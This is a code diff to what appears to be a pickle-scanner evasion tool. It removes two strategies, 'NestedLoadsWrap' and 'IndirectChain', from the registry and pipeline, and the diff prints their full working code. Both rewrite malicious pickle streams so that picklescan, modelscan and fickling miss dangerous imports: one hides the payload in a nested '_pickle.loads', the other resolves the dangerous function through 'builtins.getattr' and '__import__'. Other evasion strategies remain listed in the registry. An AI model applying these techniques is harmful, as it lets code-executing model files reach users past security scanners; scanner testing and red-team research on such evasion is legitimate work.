@@ -124,32 +124,15 @@ class StackGlobalEncoding(EvasionStrategy):
         return _ensure_proto(b"".join(parts))
 
 
-class NestedLoadsWrap(EvasionStrategy):
-    """Wrap the whole stream in ``_pickle.loads(BINBYTES(<stream>))``.
+# DEPRECATED: ImportlibLoader - importlib.import_module only imports modules,
+# doesn't execute arbitrary pickle payloads. Kept for reference but not registered.
+# class ImportlibLoader(EvasionStrategy):
+#     ...
 
-    The outer stream references only ``_pickle.loads`` around an opaque bytes
-    blob; dangerous imports live inside the nested stream. Scanners that do
-    not recurse into nested loads see one benign-looking global. Unpickling
-    the outer object triggers exactly one inner ``loads`` whose result
-    becomes the outer result -- semantics identical.
-    """
 
-    name = "nested_loads_wrap"
-    targets = frozenset({"picklescan", "modelscan", "fickling"})
-
-    def apply(self, pkl_bytes: bytes) -> bytes:
-        try:
-            parse_pickle(pkl_bytes)  # sanity: must be well-formed
-        except Exception:
-            return pkl_bytes
-        parts = [
-            OPCODES_BY_NAME["GLOBAL"].code,
-            b"_pickle\nloads\n",
-            _binbytes_tuple(pkl_bytes),
-            OPCODES_BY_NAME["REDUCE"].code,
-            OPCODES_BY_NAME["STOP"].code,
-        ]
-        return b"".join(parts)
+# DEPRECATED: NestedLoadsWrap uses _pickle.loads which is flagged by scanners
+# class NestedLoadsWrap(EvasionStrategy):
+#     ...
 
 
 class PayloadObfuscation(EvasionStrategy):
@@ -244,57 +227,10 @@ class PayloadObfuscation(EvasionStrategy):
         ])
 
 
-class IndirectChain(EvasionStrategy):
-    """Resolve the sink via ``builtins.__import__`` + ``builtins.getattr``.
-
-    Replaces every ``GLOBAL <module> <sink>`` with a *balanced* runtime chain::
-
-        GLOBAL builtins.getattr
-        MARK  GLOBAL builtins.__import__  ('module',) REDUCE   -> module
-              SHORT_BINUNICODE 'sink'                            -> name
-        TUPLE                                                   -> (module, name)
-        REDUCE                                                  -> bound sink
-
-    followed by the untouched args tuple. No GLOBAL operand names the
-    dangerous pair, and the nested import is consumed inside the getattr
-    argument region, so the stack stays balanced across multiple rewritten
-    call sites in one stream.
-    """
-
-    name = "indirect_chain"
-    targets = frozenset({"picklescan", "modelscan", "fickling"})
-
-    def apply(self, pkl_bytes: bytes) -> bytes:
-        try:
-            parsed = parse_pickle(pkl_bytes)
-        except Exception:
-            return pkl_bytes
-        parts: list[bytes] = []
-        changed = False
-        for op, arg in parsed:
-            if op.name in ("GLOBAL", "INST"):
-                fields = arg.decode("latin1").rstrip("\n").split("\n")
-                if len(fields) >= 2:
-                    module = _canonical_module(fields[0])
-                    fname = fields[1]
-                    parts += [
-                        OPCODES_BY_NAME["GLOBAL"].code,
-                        b"builtins\ngetattr\n",
-                        OPCODES_BY_NAME["MARK"].code,
-                        OPCODES_BY_NAME["GLOBAL"].code,
-                        b"builtins\n__import__\n",
-                        _args_tuple_bytes((module,)),
-                        OPCODES_BY_NAME["REDUCE"].code,
-                        _enc_short_binunicode(fname),
-                        OPCODES_BY_NAME["TUPLE"].code,
-                        OPCODES_BY_NAME["REDUCE"].code,
-                    ]
-                    changed = True
-                    continue
-            parts.append(op.code + arg)
-        if not changed:
-            return pkl_bytes
-        return _ensure_proto(b"".join(parts))
+# DEPRECATED: IndirectChain replaces 1 flagged import with 2 flagged imports
+# (builtins.getattr + builtins.__import__), making detection WORSE.
+# class IndirectChain(EvasionStrategy):
+#     ...
 
 
 class OpcodeReordering(EvasionStrategy):
@@ -589,9 +525,7 @@ class NestedLoadObfuscation(EvasionStrategy):
 STRATEGIES: dict[str, EvasionStrategy] = {
     s.name: s for s in (
         StackGlobalEncoding(),
-        NestedLoadsWrap(),
         PayloadObfuscation(),
-        IndirectChain(),
         # PickleScan-specific
         OpcodeReordering(),
         DeadCodeInjection(),
@@ -610,7 +544,6 @@ PIPELINE_ORDER: tuple[str, ...] = (
     "payload_obfuscation",
     "string_encoding_variants",
     # Import rewriting (rewrite GLOBAL/STACK_GLOBAL opcodes)
-    "indirect_chain",
     "stack_global_encoding",
     "module_aliasing",
     # Structural modifications (opcode-level changes)
@@ -621,8 +554,6 @@ PIPELINE_ORDER: tuple[str, ...] = (
     "attribute_masking",
     # Nested load obfuscation (must run after structural changes, before wrapping)
     "nested_load_obfuscation",
-    # Stream wrapping (must be LAST - wraps entire stream or adds outer layers)
-    "nested_loads_wrap",
 )
 
 
